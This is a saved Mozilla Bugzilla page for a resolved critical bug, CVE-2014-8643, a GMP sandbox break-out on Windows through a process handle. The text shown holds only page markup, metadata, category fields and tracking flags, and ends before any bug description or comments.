<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="1117140 - (CVE-2014-8643) GMP sandbox  break-out on Windows through process handle">
<meta property="og:url" content="https://bugzilla.mozilla.org/show_bug.cgi?id=1117140">
<meta property="og:description"
      content="RESOLVED (jmathies) in Core - IPC. Last updated 2021-10-21.">
<meta name="twitter:label1" value="Type">
<meta name="twitter:data1" value="defect">
<meta name="twitter:label2" value="Priority">
<meta name="twitter:data2" value="--">

    <meta name="viewport" content="width=1024">
    <meta name="color-scheme" content="dark light">
    <meta name="generator" content="Bugzilla 20211025.1">
    <meta name="bugzilla-global" content="dummy"
        id="bugzilla-global" data-bugzilla="{&quot;api_token&quot;:&quot;&quot;,&quot;config&quot;:{&quot;basepath&quot;:&quot;\/&quot;},&quot;constant&quot;:{&quot;COMMENT_COLS&quot;:80},&quot;param&quot;:{&quot;maxattachmentsize&quot;:&quot;10240&quot;,&quot;maxusermatches&quot;:&quot;50&quot;,&quot;splinter_base&quot;:&quot;\/page.cgi?id=splinter.html&amp;ignore=\/&quot;},&quot;string&quot;:{&quot;bug_type_required&quot;:&quot;You must select a Type for this bug&quot;,&quot;component_required&quot;:&quot;You must select a Component for this bug&quot;,&quot;description_required&quot;:&quot;You must enter a Description for this bug&quot;,&quot;short_desc_required&quot;:&quot;You must enter a Summary for this bug&quot;,&quot;version_required&quot;:&quot;You must select a Version for this bug&quot;},&quot;user&quot;:{&quot;is_new&quot;:1,&quot;login&quot;:&quot;&quot;}}">
    <title>1117140 - (CVE-2014-8643) GMP sandbox  break-out on Windows through process handle</title>

<link rel="Top" href="/">

  


  
    <link rel="Show" title="Dependency Tree"
          href="/showdependencytree.cgi?id=1117140&amp;hide_resolved=1">
      <link rel="Show" title="Dependency Graph"
            href="/showdependencygraph.cgi?id=1117140">

      <link rel="Show" title="Bug Activity"
            href="/show_activity.cgi?id=1117140">

<link href="/static/v20211025.1/skins/yui.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/standard/global.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BugModal/web/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BMO/web/styles/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/EditComments/web/styles/inline-editor.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-structure-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-theme-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/lib/prism.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Needinfo/web/styles/needinfo.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Review/web/styles/badge.css" rel="stylesheet" type="text/css">



    
<script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/jquery/jquery-min.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/jquery/ui/jquery-ui-min.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/yui.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu-min.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/jquery/plugins/devbridgeAutocomplete/devbridgeAutocomplete-min.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/global.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/util.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/dropdown.js"></script>

      <script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv">
          YAHOO.namespace('bugzilla');
          if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
              YAHOO.util.Event._simpleRemove(window, "unload",
                                             YAHOO.util.Event._unload);
          }BUGZILLA.value_descs = JSON.parse('{\"bug_status\":{},\"resolution\":{\"\":\"---\"}}');

  
    var tracking_flags_str = "{\"comments\":{\"cf_tracking_firefox_esr91\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_sumo\":{\"none-needed\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox_relnote\":{\"?\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_a11y_review_project_flag\":{\"requested\":\"Description:\\nPlease provide an explanation of the feature or change. Include a description of the user scenario in which it would be used and how the user would complete the task(s).\\nScreenshots and visual UI specs are welcome, but please include sufficient accompanying explanation so that blind members of the accessibility team are able to understand the feature\/change.\\n\\nHow do we test this?\\nIf there is an implementation to test, please provide instructions for testing it; e.g. setting preferences, other preparation, how to trigger the UI, etc.\\n\\nWhen will this ship?\\nTracking bug\/issue:\\nDesign documents (e.g. Product Requirements Document, UI spec):\\nEngineering lead:\\nProduct manager:\\n\\nThe accessibility team has developed the Mozilla Accessibility Release Guidelines which outline what is needed to make user interfaces accessible:\\nhttps:\/\/wiki.mozilla.org\/Accessibility\/Guidelines\\nPlease describe the accessibility guidelines you considered and what steps you\'ve taken to address them:\\n\\nDescribe any areas of concern to which you want the accessibility team to give special attention:\"},\"cf_tracking_firefox95\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox93\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox94\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr78\":{\"?\":\"[Tracking Requested - why for this release]:\"}},\"flags\":{\"tracking\":{\"cf_status_firefox36\":\"fixed\",\"cf_status_firefox_esr31\":\"unaffected\",\"cf_status_b2g_2_1\":\"unaffected\",\"cf_tracking_firefox_relnote\":\"---\",\"cf_status_firefox_esr78\":\"---\",\"cf_tracking_firefox_esr91\":\"---\",\"cf_status_firefox95\":\"---\",\"cf_status_firefox37\":\"fixed\",\"cf_tracking_firefox94\":\"---\",\"cf_tracking_thunderbird_esr91\":\"---\",\"cf_status_firefox93\":\"---\",\"cf_status_thunderbird_esr78\":\"---\",\"cf_status_thunderbird_esr91\":\"---\",\"cf_tracking_firefox_esr78\":\"---\",\"cf_status_firefox35\":\"fixed\",\"cf_status_b2g_2_0\":\"unaffected\",\"cf_status_firefox94\":\"---\",\"cf_status_firefox_esr91\":\"---\",\"cf_tracking_thunderbird_esr78\":\"---\",\"cf_tracking_firefox93\":\"---\",\"cf_tracking_firefox95\":\"---\",\"cf_status_b2g_1_4\":\"unaffected\",\"cf_status_b2g_2_0m\":\"unaffected\",\"cf_status_b2g_2_2\":\"unaffected\",\"cf_status_firefox34\":\"wontfix\"},\"project\":{\"cf_fission_milestone\":\"---\",\"cf_webcompat_priority\":\"---\",\"cf_a11y_review_project_flag\":\"---\",\"cf_root_cause\":\"---\",\"cf_tracking_firefox_sumo\":\"---\"}},\"types\":[\"tracking\"]}";
    var TrackingFlags = $.parseJSON(tracking_flags_str);

  

  
  BUGZILLA.bug_id = 1117140;
  BUGZILLA.bug_title = '1117140 - (CVE-2014-8643) GMP sandbox  break-out on Windows through process handle';
  BUGZILLA.bug_summary = 'GMP sandbox  break-out on Windows through process handle';
  BUGZILLA.bug_url = 'https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1117140';
  BUGZILLA.bug_keywords = 'csectype-priv-escalation, csectype-sandbox-escape, sec-critical',
  BUGZILLA.user = {
    id: 0,
    login: '',
    is_insider: false,
    is_timetracker: false,
    can_tag: false,
    timezone: 'America\/Los_Angeles',
    settings: {
      quote_replies: 'quoted_reply',
      zoom_textareas: true,
      remember_collapsed: true,
      inline_attachments: true,
      autosize_comments: false
    }
  };

  BUGZILLA.bug_secure = false;
      </script>
<script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/BugModal/web/autosize.min.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/ProdCompSearch/web/js/prod_comp_search.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/BugModal/web/bug_modal.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/BugModal/web/comments.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/ComponentWatching/web/js/overlay.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/bugzilla-readable-status-min.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/field.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/comments.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/TrackingFlags/web/js/flags.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/BMO/web/js/firefox-crash-table.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/MozChangeField/web/js/severity-s1-priority-p1.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/MozChangeField/web/js/clear-tracking-priority-s1.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/MozChangeField/web/js/set-tracking-severity-s1.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/lib/prism.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/GoogleAnalytics/web/js/analytics.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/js/lib/md5.min.js"></script><script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv" src="/static/v20211025.1/extensions/Review/web/js/badge.js"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla@Mozilla" href="/search_plugin.cgi"><link rel="shortcut icon" href="/extensions/BMO/web/images/favicon.ico">
<link rel="canonical" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1117140">
<link rel="shorturl" href="https://bugzilla.mozilla.org/1117140"><meta name="google-analytics" content="UA-36116321-3" data-location="https://bugzilla.mozilla.org/bug/show-modal" data-title="1117140 - (CVE-2014-8643) GMP sandbox break-out on Windows through process handle">
<script async src="https://www.google-analytics.com/analytics.js"></script><meta name="robots" content="noarchive">
  </head>



  <body
        class="bugzilla-mozilla-org
               skin-standard bug_modal yui-skin-sam">



<div id="wrapper">

<header id="header" role="banner">
  <div class="inner">
    <h1 id="header-title" class="title"><a href="https://bugzilla.mozilla.org/home" title="Go to home page">Bugzilla</a></h1>
    <form role="search" id="header-search" class="quicksearch" action="/buglist.cgi" data-no-csrf>
      <section class="searchbox-outer dropdown" role="combobox" aria-expanded="false" aria-haspopup="listbox"
               aria-labelledby="header-search-label" aria-owns="header-search-dropdown">
        <h2 id="header-search-label">Quick Search</h2>
        <span class="icon" aria-hidden="true"></span>
        <input role="searchbox" id="quicksearch_top" class="dropdown-button" name="quicksearch" autocomplete="off"
               value="" placeholder="Search Bugs"
               title="Enter a bug number or some search terms" aria-controls="header-search-dropdown"
               aria-label="Quick Search"><div id="header-search-dropdown" class="dropdown-content right" role="listbox" style="display: none;">
  <div id="header-search-dropdown-wrapper">
  </div>
</div>
      </section>
    </form>
    <nav id="header-nav">
      <ul class="links">
        <li class="link-browse">
          <a href="/describecomponents.cgi" title="Browse bugs by component">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Browse</span>
          </a>
        </li>
        <li class="link-search">
          <a href="/query.cgi?format=advanced" title="Search bugs using various criteria">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Advanced Search</span>
          </a>
        </li>
      </ul>
      <div class="dropdown">
        <button type="button" id="header-tools-menu-button" class="dropdown-button minor" title="More tools…"
                aria-label="More tools…" aria-expanded="false" aria-haspopup="true" aria-controls="header-tools-menu">
          <span class="icon" aria-hidden="true"></span>
        </button>
        <ul class="dropdown-content left" id="header-tools-menu" role="menu" style="display:none;">
          <li role="presentation">
            <a href="/report.cgi" role="menuitem" tabindex="-1">Reports</a>
          </li>
            <li role="separator"></li>
            <li role="presentation">
              <a href="https://bmo.readthedocs.io/en/latest/" role="menuitem" tabindex="-1">Documentation</a>
            </li>
        </ul>
      </div>
    </nav>
      <ul id="header-login" class="links">
          <li id="moz_new_account_container_top"><a href="/createaccount.cgi">New Account</a></li><li id="mini_login_container_top">
  <a id="login_link_top" href="/index.cgi?GoAheadAndLogIn=1"
     class='show_mini_login_form' data-qs-suffix="_top">Log In</a>

  <div id="mini_login_top" class="mini-popup mini_login bz_default_hidden"><span id="github_mini_login_top" class="mini_login_top">
    <form method="post" action="/github.cgi">
      <input type="hidden" name="github_secret" value="FIIC22muMteTzSFSVQGMTAxJx88oQ6aagQb3AvSV59xZrNzTKpPHlO0N6ZnmwUwL9GuRhncSQZeR1lzO9aQ7xAoxev97t2vdDCJF9KUkLCasL4ZzzZj7RTYYgAiTBveilaovksz4ckROWmxSKjB30x3aubGYhkH8XgOer9ax2liUgJL4OuzBMeMQ35ScNyEpJWp5ysLsQWq2qSUky3XzvxKuyKuBwOLPZuQ4TJLbqCep4fv9PM66qdmwp4cjTfXB">
      <input type="hidden" name="target_uri" value="https://bugzilla.mozilla.org/show_bug.cgi">
      <input type="image" src="/extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
  </span>

  <form action="/show_bug.cgi?id=1117140" method="POST"
        data-qs-suffix="_top">

    <input id="Bugzilla_login_top"
           class="bz_login"
           name="Bugzilla_login"
           title="Login"
           placeholder="Email"
           aria-label="Email"
           type="email"
           required
    >
    <input class="bz_password"
           id="Bugzilla_password_top"
           name="Bugzilla_password"
           type="password"
           title="Password"
           placeholder="Password"
           aria-label="Password"
           required
    >
    <input class="bz_password bz_default_hidden bz_mini_login_help" type="text"
           id="Bugzilla_password_dummy_top" value="password"
           title="Password"
    >
      <input type="checkbox" id="Bugzilla_remember_top"
             name="Bugzilla_remember" value="on" class="bz_remember"
                 checked>
      <label for="Bugzilla_remember_top">Remember</label>
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
           class="check_mini_login_fields"
            id="log_in_top">
    <a href="#" id="hide_mini_login_top" aria-label="Close"
       class="close-button hide_mini_login_form" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
<li id="forgot_container_top">
  <a id="forgot_link_top" href="/index.cgi?GoAheadAndLogIn=1#forgot"
     class='show_forgot_form'
     data-qs-suffix="_top">Forgot Password</a>
  <div id="forgot_form_top" class="mini-popup mini_forgot bz_default_hidden">
  <form action="/token.cgi" method="post">
    <input type="email" name="loginname" size="20" placeholder="Email" aria-label="Email" required>
    <input id="forgot_button_top" value="Reset Password"
           type="submit">
    <input type="hidden" name="a" value="reqpw">
    <input type="hidden" id="token_top" name="token" value="1635622562-ErMo4BVlfvwScpaFpF5b33k9zJL21f6jZ6RTEvzPNUQ">
    <a href="#" class="close-button hide_forgot_form" aria-label="Close" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
      </ul><div id="header-external-links" class="dropdown first">
  <button type="button" id="header-external-menu-button" class="dropdown-button minor" title="Mozilla"
          aria-label="Mozilla" aria-expanded="false" aria-haspopup="true" aria-controls="header-external-menu">
    <img src="/static/v20211025.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg" width="32" height="32" alt="">
  </button>
  <ul class="dropdown-content right" id="header-external-menu" role="menu" style="display:none;">
    <li role="presentation">
      <a href="https://www.mozilla.org/" role="menuitem" tabindex="-1">Mozilla Home</a>
    </li>
    <li role="separator"></li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/" role="menuitem" tabindex="-1">Privacy</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/#cookies" role="menuitem" tabindex="-1">Cookies</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/about/legal/" role="menuitem" tabindex="-1">Legal</a>
    </li>
  </ul>
</div>
  </div>
</header> 


<main id="bugzilla-body" tabindex="-1">

<aside id="message-container" role="complementary">
  <noscript>
    <div class="noscript">
      <div class="inner">
        <p>Please enable JavaScript in your browser to use all the features on this site.</p>
      </div>
    </div>
  </noscript>
</aside>

<div id="main-inner">




<div role="toolbar" id="page-toolbar">
  <div role="group" class="buttons">
    <button type="button" id="copy-summary" class="secondary"
      title="Copy bug number and summary to your clipboard">Copy Summary</button>
    <div id="clip-container" style="display:none"><input type="text" id="clip"></div>
    <div class="dropdown">
      <button type="button" id="action-menu-btn" aria-haspopup="true" aria-label="View"
        aria-expanded="false" aria-controls="action-menu" class="dropdown-button secondary">View &#9662;</button>
      <ul class="dropdown-content left" id="action-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="action-reset" role="menuitem" tabindex="-1">Reset Sections</a>
        </li>
        <li role="presentation">
          <a id="action-expand-all" role="menuitem" tabindex="-1">Expand All Sections</a>
        </li>
        <li role="presentation">
          <a id="action-collapse-all" role="menuitem" tabindex="-1">Collapse All Sections</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a id="action-history" role="menuitem" tabindex="-1">History</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a href="/rest/bug/1117140" role="menuitem" tabindex="-1">JSON</a>
        </li>
        <li role="presentation">
          <a href="/show_bug.cgi?ctype=xml&amp;id=1117140" role="menuitem" tabindex="-1">XML</a>
        </li>
      </ul>
    </div>
  </div>
</div>



<div role="status" id="io-error" style="display:none"></div>
<div role="status" id="floating-message" style="display:none">
  <div id="floating-message-text"></div>
</div>
<section class="module"
>
  <div class="module-content"
  >
  <div id="summary-container">
    <div class="field indent" id="field-status_summary"
>


  
    <div class=" container">
        <span id="field-value-status_summary">
      <span class="bug-status-label text" data-status="closed">Closed</span>
      <span id="field-value-bug_id">
        <a href="/show_bug.cgi?id=1117140">Bug 1117140</a>
          <span class="edit-hide">(CVE-2014-8643)</span>
      </span>
      <span>
        <span class="bug-time-label">Opened <span class="rel-time" title="2015-01-02 09:32 PST" data-time="1420219929">7 years ago</span></span>
          <span class="bug-time-label">Closed <span class="rel-time" title="2015-01-08 05:32 PST" data-time="1420723975">7 years ago</span></span>
      </span>
        </span>
    </div>

  
</div>
<div class="field indent edit-hide"
>


  
    <div class=" container">
      

      <h1 id="field-value-short_desc">GMP sandbox  break-out on Windows through process handle</h1>
    </div>

  
</div>

    <div class="field edit-show" id="field-short_desc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc" id="short_desc-help-link" class="help">Summary:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-short_desc">
            GMP sandbox  break-out on Windows through process handle

        </span>
    </div>

  
</div>
  </div>
  </div>
</section>


<section class="module" id="module-categories"
>
    <header id="module-categories-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Categories section"
           data-label-collapsed="Expand Categories section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-categories-content"
             aria-expanded="true"
             aria-labeledby="module-categories-title"
             aria-describedby="module-categories-subtitle"></div>
        <h2 class="module-title" id="module-categories-title">Categories</h2>
          <h3 class="module-subtitle" id="module-categories-subtitle">
            (Core :: IPC, defect)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-categories-content"
  ><div class="fields-lhs">

    <div class="field" id="field-product"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core" id="product-help-link" class="help">Product:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-product">
      <div class="name-info-outer dropdown">
        <span id="product-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="product-info">Core
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="product-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Product description and actions">
          <header>
            <div class="title">Core</div>
            <div class="description">Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the <a href="https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox">Firefox</a> product. (<a href="https://wiki.mozilla.org/Modules/All#Core">More info</a>)</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Product</a></div>
            <div><a href="/enter_bug.cgi?product=Core"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Product</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core"
                         data-label-watch="Watch This Product" data-label-unwatch="Unwatch This Product"
                         data-source="BugModal">Watch This Product</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-component"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core&component=IPC#IPC" id="component-help-link" class="help">Component:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-component">
      <div class="name-info-outer dropdown">
        <span id="component-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="component-info">IPC
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="component-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Component description and actions">
          <header>
            <div class="title">Core :: IPC</div>
            <div class="description">Core inter-process communication and IPDL system for communicating with and isolating sub-processes. Please file plugin-specific IPC bugs in Core: Plug-Ins and content-specific IPC bugs in Core: DOM: Content Processes.</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;component=IPC&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Component</a></div>
            <div><a href="/buglist.cgi?product=Core&amp;component=IPC&amp;chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__"
                    target="_blank" role="menuitem" tabindex="-1">Recently Fixed Bugs in This Component</a></div>
            <div><a href="/enter_bug.cgi?product=Core&amp;component=IPC"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Component</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core" data-component="IPC"
                         data-label-watch="Watch This Component" data-label-unwatch="Unwatch This Component"
                         data-source="BugModal">Watch This Component</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-version" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#version" id="version-help-link" class="help">Version:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-version">
            unspecified

        </span>
    </div>

  
</div>

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform" id="-help-link" class="help">Platform:
        </a>
    </div>


  
    <div class=" container"><div class="field inline" id="field-rep_platform"
>


  
    <div class="value">
        <span id="field-value-rep_platform">
            x86_64

        </span>
    </div>

  
</div><div class="field indent inline" id="field-op_sys"
>


  
    <div class="value">
        <span id="field-value-op_sys">
            Windows 8.1

        </span>
    </div>

  
</div><div class="field indent inline"
>


  
    <div class=" container">
    </div>

  
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field contains-buttons" id="field-bug_type"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type" id="bug_type-help-link" class="help">Type:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_type">
      <span class="bug-type-label iconic-text" data-type="defect">
        <span class="icon" aria-hidden="true"></span>defect</span>
        </span>
    </div>

  
</div>

    <div class="field" id="field-importance"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority" id="importance-help-link" class="help">Priority:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-importance"><div class="field inline" id="field-priority"
>


  
    <div class="value">
        <span id="field-value-priority">
          <em>Not set</em>
        </span>
    </div>

  
</div><div class="field inline" id="field-bug_severity"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity" id="bug_severity-help-link" class="help">Severity:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_severity">
            normal

        </span>
    </div>

  
</div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_points" style="display:none"
>
    <div class="name">Points:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_points">
            ---

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-tracking"
>
    <header id="module-tracking-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Tracking section"
           data-label-collapsed="Expand Tracking section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-tracking-content"
             aria-expanded="true"
             aria-labeledby="module-tracking-title"
             aria-describedby="module-tracking-subtitle"></div>
        <h2 class="module-title" id="module-tracking-title">Tracking</h2>
          <h3 class="module-subtitle" id="module-tracking-subtitle">
            (<span id="readable-bug-status" data-readable-bug-status="{&quot;cf_status_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_tracking_thunderbird_esr78&quot;:&quot;---&quot;,&quot;cf_status_firefox94&quot;:&quot;---&quot;,&quot;cf_status_b2g_2_0&quot;:&quot;unaffected&quot;,&quot;id&quot;:1117140,&quot;cf_tracking_firefox93&quot;:&quot;---&quot;,&quot;cf_tracking_firefox95&quot;:&quot;---&quot;,&quot;cf_a11y_review_project_flag&quot;:&quot;---&quot;,&quot;flags&quot;:[{&quot;name&quot;:&quot;sec-bounty&quot;,&quot;status&quot;:&quot;+&quot;},{&quot;name&quot;:&quot;sec-bounty-hof&quot;,&quot;status&quot;:&quot;+&quot;}],&quot;cf_tracking_firefox_sumo&quot;:&quot;---&quot;,&quot;cf_status_b2g_2_0m&quot;:&quot;unaffected&quot;,&quot;cf_webcompat_priority&quot;:&quot;---&quot;,&quot;cf_status_firefox34&quot;:&quot;wontfix&quot;,&quot;cf_status_b2g_2_2&quot;:&quot;unaffected&quot;,&quot;cf_status_b2g_1_4&quot;:&quot;unaffected&quot;,&quot;resolution&quot;:&quot;FIXED&quot;,&quot;priority&quot;:&quot;--&quot;,&quot;cf_tracking_firefox_relnote&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_status_firefox36&quot;:&quot;fixed&quot;,&quot;cf_status_firefox_esr31&quot;:&quot;unaffected&quot;,&quot;cf_status_b2g_2_1&quot;:&quot;unaffected&quot;,&quot;cf_status_firefox37&quot;:&quot;fixed&quot;,&quot;dupe_of&quot;:null,&quot;cf_tracking_firefox94&quot;:&quot;---&quot;,&quot;cf_fission_milestone&quot;:&quot;---&quot;,&quot;cf_status_firefox95&quot;:&quot;---&quot;,&quot;cf_status_firefox93&quot;:&quot;---&quot;,&quot;status&quot;:&quot;RESOLVED&quot;,&quot;cf_root_cause&quot;:&quot;---&quot;,&quot;keywords&quot;:[&quot;csectype-priv-escalation&quot;,&quot;csectype-sandbox-escape&quot;,&quot;sec-critical&quot;],&quot;target_milestone&quot;:&quot;mozilla37&quot;,&quot;cf_tracking_thunderbird_esr91&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_status_firefox35&quot;:&quot;fixed&quot;,&quot;cf_status_thunderbird_esr91&quot;:&quot;---&quot;,&quot;cf_status_thunderbird_esr78&quot;:&quot;---&quot;}"></span>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-tracking-content"
  ><div class="fields-lhs">

